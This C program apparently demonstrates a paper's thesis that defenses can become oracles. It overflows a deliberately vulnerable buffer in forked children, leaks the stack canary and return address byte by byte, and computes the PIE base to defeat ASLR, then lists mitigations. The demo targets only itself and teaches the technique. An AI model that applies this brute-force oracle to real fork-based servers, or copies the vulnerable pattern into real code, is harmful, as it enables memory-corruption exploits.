/*
 * 07_defense_as_attack_surface.c
 *
 * "Defenses as Attack Surface" - byte-at-a-time leak of the stack
 * canary, saved RBP, and return address via a fork-based crash oracle,
 * then recovery of the PIE base address to defeat ASLR.
 *
 * This demo is the userspace analog of the paper's core insight
 * ("When Good Kernel Defenses Go Bad", USENIX Security 2025):
 *
 *   A well-intentioned hardening feature can become an oracle that
 *   attackers query to defeat the very randomization it relies on.
 *
 * In the paper, three kernel defenses (CONFIG_STRICT_MODULE_RWX,
 * CONFIG_SLAB_VIRTUAL, CONFIG_VMAP_STACK) change the memory mapping
 * granularity from 2 MB to 4 kB, creating observable TLB contention
 * patterns that leak kernel object locations.
 *
 * In this demo, the stack canary (-fstack-protector-strong) is
 * supposed to stop stack overflows. But:
 *
 *   1. glibc sets the canary once at process start from AT_RANDOM.
 *   2. fork() inherits the parent's canary unchanged.
 *   3. __stack_chk_fail() aborts noisily; a clean return means the
 *      canary matched byte-for-byte.
 *
 * If any fork-accept server has a stack overflow primitive, the
 * attacker gets a crash / no-crash oracle per request. The canary
 * is just the first 8 bytes to leak, but beyond it on the stack sit
 * the saved frame pointer and the return address.  Once the canary
 * is known, the attacker can overflow with the correct canary,
 * skip the saved RBP (which does not crash when corrupted because
 * the callee goes straight to _exit), and then brute-force the
 * return address one byte at a time using the same oracle.
 *
 * The return address points into PIE-randomized .text, so leaking it
 * immediately breaks ASLR:
 *
 *     pie_base = leaked_retaddr - known_offset_from_objdump
 *
 * The full attack costs:
 *
 *     canary:    8 * 256 =  2048 probes (worst case)
 *     saved rbp: 0             (skipped -- no oracle, no crash)
 *     retaddr:   8 * 256 =  2048 probes (worst case)
 *     total:              <= 4096 probes
 *
 * versus 256^8 ~= 1.8e19 for blind brute force of either value.
 *
 * Build (stack protector ON, PIE ON -- the "hardened" configuration):
 *   gcc -O0 -g -fstack-protector-strong -fPIE -pie \
 *       -o 07_defense_as_attack_surface 07_defense_as_attack_surface.c -ldl
 *
 * Run:
 *   ./07_defense_as_attack_surface
 *
 * Expected output: the program prints the true canary and PIE base,
 * then leaks the canary byte-by-byte, skips the saved RBP, leaks the
 * return address byte-by-byte, and recovers the PIE base -- all via
 * the fork oracle.
 *
 * NOTE: This only works on x86_64 Linux with glibc and
 * -fstack-protector-strong. The overflow offsets are tuned for the
 * layout gcc -O0 produces for vulnerable_copy(); other compilers,
 * architectures, or optimization levels may need different offsets.
 */

#define _GNU_SOURCE
#include <dlfcn.h>
#include <errno.h>
#include <fcntl.h>
#include <inttypes.h>
#include <stdint.h>
#include <stdio.h>
#include <stdlib.h>
#include <string.h>
#include <sys/resource.h>
#include <sys/types.h>
#include <sys/wait.h>
#include <unistd.h>

/* ---------- the vulnerable "server" side ---------- */

/*
 * Classic stack overflow: the caller controls n, but buf is only
 * 32 bytes. With -fstack-protector-strong at -O0 gcc emits a frame
 * with buf at [rbp-0x30] and the canary at [rbp-0x8], so 8 bytes of
 * alignment padding sit between them. Writing 40 bytes fills buf
 * plus padding without touching the canary; byte 41 corrupts
 * canary[0] (which is 0x00 by design on glibc - another "defense
 * with a quirk"), byte 42 corrupts canary[1], etc.
 *
 *   low addr  [rbp-0x30] buf[0..31]       <-- legal writes
 *             [rbp-0x10] padding[0..7]    <-- "safe" to trash
 *             [rbp-0x08] canary[0..7]     <-- defense
 *   high addr [rbp+0x00] saved rbp        <-- frame pointer
 *             [rbp+0x08] return address   <-- points into .text (PIE)
 *
 * volatile on the loop index defeats the bounds analysis the
 * compiler would otherwise use to reject large n.
 *
 * If you rebuild with a different compiler / optimization level,
 * check `objdump -d` on vulnerable_copy() and update CANARY_OFFSET
 * below.
 */
__attribute__((noinline))
static void vulnerable_copy(const uint8_t *input, size_t n)
{
    uint8_t buf[32];

    /*
     * Touch input[0] unconditionally so the function always
     * dereferences the input pointer -- even when n == 0.
     * This prevents a false-positive oracle hit if a wrong return
     * address re-enters a call site with n == 0 and a bogus pointer.
     */
    volatile uint8_t touch = input[0];
    (void)touch;

    for (volatile size_t i = 0; i < n; i++) {
        buf[i] = input[i];
    }
    /* force buf to be live across the store so gcc keeps the canary */
    volatile uint8_t sink = buf[0];
    (void)sink;
}

/*
 * do_overflow() - thin noreturn wrapper that calls vulnerable_copy
 * then _exit(0).
 *
 * Why not call vulnerable_copy directly from child_handler?
 *
 * 1. After the overflow, vulnerable_copy's `leave` pops the
 *    attacker's junk into %rbp.  The code right after the `call`
 *    must NOT touch %rbp (or %rbp-relative memory), because %rbp
 *    is now garbage.  `mov $0, %edi; call _exit` is safe -- both
 *    are register-only instructions.
 *
 * 2. Keeping this wrapper tiny limits the number of byte values
 *    for the return-address LSB that can accidentally land on a
 *    benign instruction path inside the same function.  (If the
 *    call lived in the middle of the much larger child_handler,
 *    the canary check's side effect of zeroing %rax could let a
 *    wrong return re-enter the call site with n==0, producing a
 *    false-positive clean exit.)
 */
__attribute__((noinline, noreturn))
static void do_overflow(const uint8_t *input, size_t n)
{
    vulnerable_copy(input, n);
    _exit(0);
    __builtin_unreachable();
}

/*
 * Child process: read (len, payload) from the parent over a pipe,
 * feed it into the vulnerable function, then exit(0). If the canary
 * was corrupted, glibc fires __stack_chk_fail and the child is
 * killed by SIGABRT long before reaching exit(0). If the return
 * address was corrupted, the child will SIGSEGV (or similar) on
 * ret instead of reaching _exit(0).
 *
 * Note: child_handler is __attribute__((noreturn)) and goes straight
 * to _exit after do_overflow returns. This means a corrupted
 * saved RBP does NOT crash the child (rbp is never used to access
 * stack variables before _exit). This is why we can skip the saved
 * RBP during the leak -- there is no oracle for it.
 */
static void child_handler(int fd) __attribute__((noreturn));
static void child_handler(int fd)
{
    /* Disable core dumps so crash-oracle probes are fast.
     * Without this, kernel core_pattern handlers (e.g. WSL's
     * wsl-capture-crash) make each signal-death extremely slow. */
    struct rlimit nocore = {0, 0};
    setrlimit(RLIMIT_CORE, &nocore);

    /* silence "*** stack smashing detected ***" on the terminal */
    int devnull = open("/dev/null", O_WRONLY);
    if (devnull >= 0) {
        dup2(devnull, STDERR_FILENO);
        close(devnull);
    }

    uint32_t len;
    if (read(fd, &len, sizeof(len)) != (ssize_t)sizeof(len)) _exit(2);
    if (len > 256) _exit(2);

    uint8_t payload[256];
    size_t got = 0;
    while (got < len) {
        ssize_t r = read(fd, payload + got, len - got);
        if (r <= 0) _exit(2);
        got += (size_t)r;
    }

    do_overflow(payload, len);
    /* do_overflow calls _exit(0) if canary + retaddr were intact. */
    /* If we ever get here, something went wrong. */
    _exit(3);
}

/* ---------- the "attacker" side ---------- */

/*
 * Bytes of filler needed before the canary starts. Equals the
 * offset from buf[0] to canary[0] in vulnerable_copy()'s frame.
 * Confirm with `objdump -d` after changing compiler flags.
 */
#define CANARY_OFFSET 40

/*
 * probe(payload, n):
 *   Fork a child, make it run vulnerable_copy with
 *   the given payload of n bytes.
 *
 * Returns 1 iff the child exited cleanly (all overwritten bytes
 * matched the originals on the stack -- canary correct, return
 * address correct, etc.).
 */
static int probe(const uint8_t *payload, size_t n)
{
    int pipefd[2];
    if (pipe(pipefd) != 0) { perror("pipe"); exit(1); }

    pid_t pid = fork();
    if (pid < 0) { perror("fork"); exit(1); }

    if (pid == 0) {
        close(pipefd[1]);
        alarm(1);           /* kill child if stuck in an infinite loop */
        child_handler(pipefd[0]);
    }
    close(pipefd[0]);

    uint32_t total = (uint32_t)n;

    if (write(pipefd[1], &total, sizeof(total)) != (ssize_t)sizeof(total)) _exit(1);
    if (n > 0 && write(pipefd[1], payload, n) != (ssize_t)n) _exit(1);
    close(pipefd[1]);

    int status;
    if (waitpid(pid, &status, 0) < 0) { perror("waitpid"); exit(1); }

    return WIFEXITED(status) && WEXITSTATUS(status) == 0;
}

/*
 * leak_bytes():
 *   Generic byte-at-a-time brute-force using the fork oracle.
 *
 *   prefix      -- already-known bytes (filler + previously leaked bytes)
 *   prefix_len  -- length of prefix
 *   out         -- buffer to receive leaked bytes
 *   count       -- how many bytes to leak
 *   label       -- human-readable name for progress output
 *   probes      -- running probe counter (updated in place)
 *
 * Returns 0 on success, -1 if any byte could not be determined.
 */
static int leak_bytes(const uint8_t *prefix, size_t prefix_len,
                      uint8_t *out, size_t count,
                      const char *label, int *probes)
{
    /* Build a working buffer: [prefix | out[0..count-1]] */
    size_t bufsz = prefix_len + count;
    uint8_t *buf = malloc(bufsz);
    if (!buf) { perror("malloc"); exit(1); }
    memcpy(buf, prefix, prefix_len);
    memset(buf + prefix_len, 0, count);

    for (size_t idx = 0; idx < count; idx++) {
        int found = -1;
        for (int g = 0; g < 256; g++) {
            buf[prefix_len + idx] = (uint8_t)g;
            (*probes)++;
            if (probe(buf, prefix_len + idx + 1)) {
                found = g;
                break;
            }
        }
        if (found < 0) {
            fprintf(stderr, "[-] %s byte %zu: no guess survived, aborting\n",
                    label, idx);
            free(buf);
            return -1;
        }
        out[idx] = (uint8_t)found;
        printf("    %s byte %zu leaked: 0x%02x  (total probes so far: %d)\n",
               label, idx, found, *probes);
    }

    free(buf);
    return 0;
}

/* ---------- ground truth (for verification only) ---------- */

/*
 * On x86_64 Linux glibc stores the per-thread canary at %fs:0x28
 * (struct pthread::stack_guard). Reading it directly lets the demo
 * compare the leaked value against the true one. An attacker would
 * not have this read; the whole point is that they recover it via
 * the oracle.
 */
static uint64_t true_canary(void)
{
#if defined(__x86_64__)
    uint64_t v;
    __asm__("mov %%fs:0x28, %0" : "=r"(v));
    return v;
#else
    return 0;
#endif
}

/*
 * Get the PIE base address from /proc/self/maps. The first mapping
 * whose pathname matches our own executable is the .text segment;
 * its start address is the load base.
 */
static uintptr_t true_pie_base(void)
{
    uintptr_t base = 0;
    char exe_path[256];
    ssize_t len = readlink("/proc/self/exe", exe_path, sizeof(exe_path) - 1);
    if (len <= 0) return 0;
    exe_path[len] = '\0';

    FILE *f = fopen("/proc/self/maps", "r");
    if (!f) return 0;

    char line[512];
    while (fgets(line, sizeof(line), f)) {
        if (strstr(line, exe_path)) {
            base = (uintptr_t)strtoull(line, NULL, 16);
            break;
        }
    }
    fclose(f);
    return base;
}

/*
 * Find the .text offset of the return address that sits on
 * vulnerable_copy's stack frame.
 *
 * vulnerable_copy is called from do_overflow, so the return address
 * points to the instruction right after `call vulnerable_copy` in
 * do_overflow. We scan do_overflow's machine code for the E8 (near
 * call) whose target is vulnerable_copy.
 *
 * This is what an attacker would do with a copy of the binary
 * (objdump), but we automate it here for robustness across
 * recompilations.
 */
static uintptr_t find_retaddr_offset(void)
{
    const uint8_t *fn = (const uint8_t *)(uintptr_t)do_overflow;
    const uint8_t *target = (const uint8_t *)(uintptr_t)vulnerable_copy;

    /* Scan up to 128 bytes into do_overflow looking for a CALL rel32 */
    for (size_t i = 0; i < 128; i++) {
        if (fn[i] == 0xE8) {  /* near call opcode */
            int32_t rel;
            memcpy(&rel, &fn[i + 1], 4);
            const uint8_t *call_target = &fn[i + 5] + rel;
            if (call_target == target) {
                /* Return address = instruction after the call */
                uintptr_t retaddr = (uintptr_t)&fn[i + 5];
                Dl_info info;
                if (dladdr((void *)retaddr, &info) && info.dli_fbase) {
                    return retaddr - (uintptr_t)info.dli_fbase;
                }
            }
        }
    }
    return 0;
}

/* assemble 8 little-endian bytes into a uint64_t */
static uint64_t bytes_to_u64(const uint8_t *b)
{
    uint64_t v = 0;
    for (int i = 7; i >= 0; i--)
        v = (v << 8) | b[i];
    return v;
}

/* ---------- driver ---------- */

int main(void)
{
    printf("=== Defenses as Attack Surface: "
           "canary + retaddr leak via fork oracle ===\n\n");

    /* ---- ground truth ---- */
    uint64_t real_canary = true_canary();
    uintptr_t real_base  = true_pie_base();
    uintptr_t retaddr_off = find_retaddr_offset();

    printf("[ground truth]\n");
    printf("  canary    (%%fs:0x28)         = 0x%016" PRIx64 "\n", real_canary);
    printf("  PIE base  (/proc/self/maps)  = 0x%016" PRIxPTR "\n", real_base);
    printf("  expected retaddr offset      = 0x%" PRIxPTR "\n", retaddr_off);
    printf("  expected retaddr             = 0x%016" PRIxPTR "\n",
           real_base + retaddr_off);
    printf("  (canary byte 0 is 0x00 by design -- glibc ABI)\n\n");

    int total_probes = 0;

    /*
     * ========== Phase 1: leak the 8-byte stack canary ==========
     *
     * Oracle: wrong canary byte -> __stack_chk_fail -> SIGABRT.
     *         correct canary byte -> child_handler reaches _exit(0).
     */
    printf("[Phase 1] Leaking stack canary (8 bytes)\n");
    printf("  Oracle: wrong byte -> __stack_chk_fail -> crash\n\n");

    uint8_t filler[CANARY_OFFSET];
    memset(filler, 'A', sizeof(filler));

    uint8_t canary_bytes[8];
    if (leak_bytes(filler, CANARY_OFFSET, canary_bytes, 8,
                   "canary", &total_probes) != 0) {
        return 1;
    }
    uint64_t recovered_canary = bytes_to_u64(canary_bytes);

    printf("\n  [+] recovered canary  = 0x%016" PRIx64 "\n", recovered_canary);
    printf("  [+] true canary       = 0x%016" PRIx64 "\n", real_canary);
    printf("  [+] match             = %s\n\n",
           recovered_canary == real_canary ? "YES" : "NO");

    /*
     * ========== Phase 2: skip the saved RBP (8 bytes) ==========
     *
     * After the canary comes the saved frame pointer [rbp+0x00].
     * Corrupting it does NOT crash the child: child_handler goes
     * straight to `_exit(0)` after vulnerable_copy returns, and
     * _exit never dereferences rbp. So there is no oracle to
     * distinguish correct from incorrect RBP bytes.
     *
     * In a real exploit the attacker would just fill these 8 bytes
     * with anything (or with the leaked canary's neighbor if a
     * stack pivot is planned). For this demo we write 8 bytes of
     * 'B' -- the child still exits cleanly because rbp is unused.
     */
    printf("[Phase 2] Skipping saved RBP (8 bytes) -- no oracle, any value works\n");
    printf("  (child_handler -> _exit(0) never dereferences rbp)\n\n");

    uint8_t rbp_filler[8];
    memset(rbp_filler, 'B', sizeof(rbp_filler));

    /*
     * ========== Phase 3: leak the 8-byte return address ==========
     *
     * Oracle: wrong retaddr byte -> child jumps to a bogus address
     *         after `ret` -> SIGSEGV (or SIGBUS, SIGILL, etc.).
     *         correct byte -> original retaddr intact -> _exit(0).
     *
     * The return address points into PIE-randomized .text, so
     * leaking it breaks ASLR.
     */
    printf("[Phase 3] Leaking return address (8 bytes)\n");
    printf("  Oracle: wrong byte -> ret to bad address -> crash\n\n");

    /* Build the prefix: filler + canary + rbp_filler */
    size_t prefix_len = CANARY_OFFSET + 8 + 8;  /* filler + canary + rbp */
    uint8_t *prefix = malloc(prefix_len);
    if (!prefix) { perror("malloc"); return 1; }
    memcpy(prefix, filler, CANARY_OFFSET);
    memcpy(prefix + CANARY_OFFSET, canary_bytes, 8);
    memcpy(prefix + CANARY_OFFSET + 8, rbp_filler, 8);

    uint8_t retaddr_bytes[8];
    if (leak_bytes(prefix, prefix_len, retaddr_bytes, 8,
                   "retaddr", &total_probes) != 0) {
        free(prefix);
        return 1;
    }
    free(prefix);

    uint64_t recovered_retaddr = bytes_to_u64(retaddr_bytes);
    uintptr_t recovered_base = (uintptr_t)recovered_retaddr - retaddr_off;

    printf("\n  [+] recovered retaddr = 0x%016" PRIx64 "\n", recovered_retaddr);
    printf("  [+] expected retaddr  = 0x%016" PRIxPTR "\n",
           real_base + retaddr_off);
    printf("  [+] match             = %s\n\n",
           (uintptr_t)recovered_retaddr == real_base + retaddr_off
               ? "YES" : "NO");

    /*
     * ========== Phase 4: recover PIE base ==========
     *
     * pie_base = leaked_retaddr - retaddr_offset_in_binary
     *
     * The offset is a compile-time constant that the attacker reads
     * from `objdump -d` on a copy of the binary (or computes from
     * the call instruction inside child_handler, as we did above).
     */
    printf("[Phase 4] Recovering PIE base address\n\n");
    printf("  retaddr offset in binary     = 0x%" PRIxPTR "\n", retaddr_off);
    printf("  recovered PIE base           = 0x%016" PRIxPTR "\n", recovered_base);
    printf("  true PIE base                = 0x%016" PRIxPTR "\n", real_base);
    printf("  match                        = %s\n\n",
           recovered_base == real_base ? "YES" : "NO");

    /* ---- summary ---- */
    printf("=== Summary ===\n\n");
    printf("  total probes used            = %d\n", total_probes);
    printf("  blind brute force (canary)   = 256^8 ~= 1.8e19\n");
    printf("  blind brute force (retaddr)  = 256^8 ~= 1.8e19\n");
    printf("  oracle-assisted (both)       <= 2 * 8 * 256 = 4096\n\n");

    printf("Takeaway:\n");
    printf("  The canary alone is \"just 8 random bytes\"; the real prize is\n");
    printf("  the return address sitting 16 bytes further up the stack.\n");
    printf("  Leaking it breaks PIE/ASLR, giving the attacker a full map\n");
    printf("  of .text -- enough to build a ROP chain and achieve\n");
    printf("  arbitrary code execution.\n\n");
    printf("  The stack canary didn't fail because it was weak.  It failed\n");
    printf("  because fork() + __stack_chk_fail() provided a 1-bit oracle\n");
    printf("  per attempt.  This is the paper's central thesis in miniature:\n");
    printf("  a hardening feature made behavior observable in a way that\n");
    printf("  multiplied attacker signal.\n\n");
    printf("  Mitigations:\n");
    printf("    * re-randomize canary after fork (glibc does not do this)\n");
    printf("    * use exec, not fork, for request isolation\n");
    printf("    * rate-limit / ban on __stack_chk_fail\n");
    printf("    * shadow stack (-fcf-protection=full) survives this leak\n");
    printf("      because the attacker still cannot forge a return address\n");
    printf("      on the hardware shadow stack\n");
    return 0;
}
